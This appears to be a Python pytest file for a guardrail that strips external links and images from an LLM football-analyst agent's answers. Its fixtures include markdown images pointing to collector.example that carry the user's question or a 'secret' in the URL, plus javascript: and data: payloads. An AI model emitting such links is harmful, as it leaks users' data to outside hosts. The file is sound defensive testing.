"""Output handling (src/guardrails/links.py), offline: no external link and no image reaches the coach, with
the guardrails on or off, and nothing else of an answer changes."""

from __future__ import annotations

import json

import pytest

from src.agent.analyst_agent import MatchAnalyst
from src.core.config import PROJECT_ROOT
from src.guardrails.additions import tidy
from src.guardrails.links import strip_external_links
from src.ui import view
from tests.fakes import ScriptedLLM

CITED = "Attacca le zone intermedie [situation_attaccare_un_blocco_basso]."
QUESTION = "Primavera del Chievo: si gioca alla domenica come ci si allena durante la settimana"
ATTACK = ("Il 4-4-2 della tesi compatta la squadra e sfrutta le fasce [coach_pioli]. "
          "![badge](https://collector.example/p.png?d=LA-TUA-DOMANDA) Altro: [clicca](https://collector.example/x?q=1).")


def test_an_image_is_removed_whole_and_a_link_keeps_its_text():
    text, removed = strip_external_links(f"{CITED}\n\n![badge](https://collector.example/b.png?d=SEGRETO) "
                                         "Dettaglio: [clicca](https://collector.example/x?q=1).")
    assert "collector.example" not in text and "badge" not in text and "SEGRETO" not in text
    assert text == f"{CITED}\n\n Dettaglio: clicca."
    assert removed == ["![badge](https://collector.example/b.png?d=SEGRETO)", "[clicca](https://collector.example/x?q=1)"]


@pytest.mark.parametrize("attack", [
    "![x](https://e.example/a.png)",                              # an image
    "![chi sono][1]\n\n[1]: https://e.example/a.png",             # a reference-style image
    "[vedi][1] il dettaglio\n\n[1]: http://e.example/a",          # a reference-style link
    "vedi https://e.example/a?b=1 e http://e.example",            # bare addresses
    "vedi www.e.example/a",                                       # no scheme
    "vedi <https://e.example/a>",                                 # an autolink
    "[x](javascript:alert(1)) e [y](data:text/html;base64,AAAA)",   # a script and a data address
    "[x](//e.example/a) e ![y](//e.example/a.png)",               # a protocol-relative address
    "[mail](mailto:a@e.example)",
    "![alt (con parentesi)](https://e.example/a_(b).png)",
    "[X](HTTPS://E.EXAMPLE/A)",                                   # case does not matter
])
def test_no_address_survives(attack):
    text, removed = strip_external_links(f"Prima. {attack}\n\nDopo.")   # a definition is a line of its own
    assert removed and "e.example" not in text.lower() and "javascript" not in text and "data:" not in text
    assert text.startswith("Prima.") and text.endswith("Dopo.")
    assert strip_external_links(text) == (text, [])                # nothing left to remove: idempotent


def test_the_citations_and_the_references_of_the_cards_stay():
    kept = ("Citazioni [coach_pioli, p. 4] e [case_a][case_b] e [situation_x] [coach_y]; riferimenti (Spalla, pp. 45-46), "
            "(Wikipedia) e [Contran, p. 72]. Il 4-3-3 contro il 4-4-2 (ripartenze veloci), 1-0 al 73'.\n\n"
            "- punto 1 [a_b](pp. 3)\n- punto 2")
    assert strip_external_links(kept) == (kept, [])


def test_the_text_around_a_removed_address_is_tidy():
    text, _ = strip_external_links("Vedi (https://e.example/a) e poi www.e.example/b , basta.\n\n\n\nFine.")
    assert text == "Vedi e poi, basta.\n\nFine."


def test_what_the_agent_measured_before_has_no_address_to_remove():
    # every answer saved in the runs (agent and gold runs, 2026-09 to 2026-10): none changes, so the answers
    # measured before are the ones the coach gets now and no gold run is needed
    answers = []

    def collect(node):
        if isinstance(node, dict):
            for key, value in node.items():
                if key in ("answer", "previous_answer") and isinstance(value, str):
                    answers.append(value)
                else:
                    collect(value)
        elif isinstance(node, list):
            for item in node:
                collect(item)

    for path in sorted((PROJECT_ROOT / "eval" / "runs").glob("*.json")):
        collect(json.loads(path.read_text(encoding="utf-8")))
    assert len(answers) > 200
    assert [a for a in answers if strip_external_links(a) != (a, [])] == []


def test_tidy_reports_the_links_it_removed():
    answer, done = tidy("Risposta [coach_pioli]. ![x](https://e.example/a.png)", english=False)
    assert "e.example" not in answer and done["links"] == ["![x](https://e.example/a.png)"]
    assert "links" not in tidy("Risposta [coach_pioli].", english=False)[1]


# ---------------------------------------------------------------- in the agent and in the app
def test_the_agent_keeps_the_address_out_of_the_answer_the_memory_and_the_report(retriever):
    chat = MatchAnalyst(client=ScriptedLLM(answer=ATTACK), retriever=retriever, stateless=False)
    answer = chat.analyze(QUESTION)
    assert "collector.example" not in answer and "[coach_pioli]" in answer and "Altro: clicca." in answer
    assert chat.last_guard["links"] == ["![badge](https://collector.example/p.png?d=LA-TUA-DOMANDA)",
                                        "[clicca](https://collector.example/x?q=1)"]    # what it tried, kept as evidence
    assert "tolti 2 link o immagini esterni" in chat.guard_note
    assert "collector.example" not in chat.agent._memory[-1][0].content                # nor the next question's context
    assert chat.last_guard["rewritten"] is False                                       # no rewrite spent on an address


def test_with_the_guardrails_off_the_answer_is_not_touched_but_it_is_still_shown_without_the_address(retriever):
    bare = MatchAnalyst(client=ScriptedLLM(answer=ATTACK), retriever=retriever, guardrails=False)
    raw = bare.analyze(QUESTION)
    assert "collector.example" in raw                                                  # the bare agent, to measure
    shown = view.answer_html(raw, view.load_card_index())
    assert "collector.example" not in shown and "![" not in shown and "Altro: clicca." in shown   # the app, always


def test_the_page_shows_no_external_image(retriever):
    attack = view.answer_html("Testo [coach_pioli].\n\n![x](https://collector.example/p.png?d=1)", view.load_card_index())
    assert "collector.example" not in attack and "Testo" in attack
